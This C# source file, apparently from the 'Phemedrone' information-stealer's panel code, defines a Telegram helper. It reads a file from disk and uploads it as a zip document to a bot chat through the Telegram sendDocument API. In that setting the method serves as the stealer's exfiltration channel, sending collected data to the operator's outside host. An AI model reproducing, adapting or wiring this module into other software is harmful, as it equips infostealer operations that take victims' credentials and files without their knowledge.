namespace Phemedrone.Panel;

public class Telegram
{
    public static void Send(string botToken, string chatId, string filePath, string filename, string caption)
    {
        Task.Run(async () =>
        {
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();

                form.Add(new StringContent(chatId), "chat_id");
                form.Add(new StringContent(caption), "caption");

                using (FileStream fileStream = File.OpenRead(filePath))
                {
                    byte[] fileBytes = new byte[fileStream.Length];
                    await fileStream.ReadAsync(fileBytes, 0, (int) fileStream.Length);

                    ByteArrayContent byteArrayContent = new ByteArrayContent(fileBytes);
                    byteArrayContent.Headers.Add("Content-Type", "application/zip");
                    byteArrayContent.Headers.Add("Content-Disposition",
                        $"form-data; name=\"document\"; filename=\"{filename}\"");

                    form.Add(byteArrayContent, "document", filename);

                    string apiUrl = $"https://api.telegram.org/bot{botToken}/sendDocument";
                    await httpClient.PostAsync(apiUrl, form);
                }
            }
        });
    }
}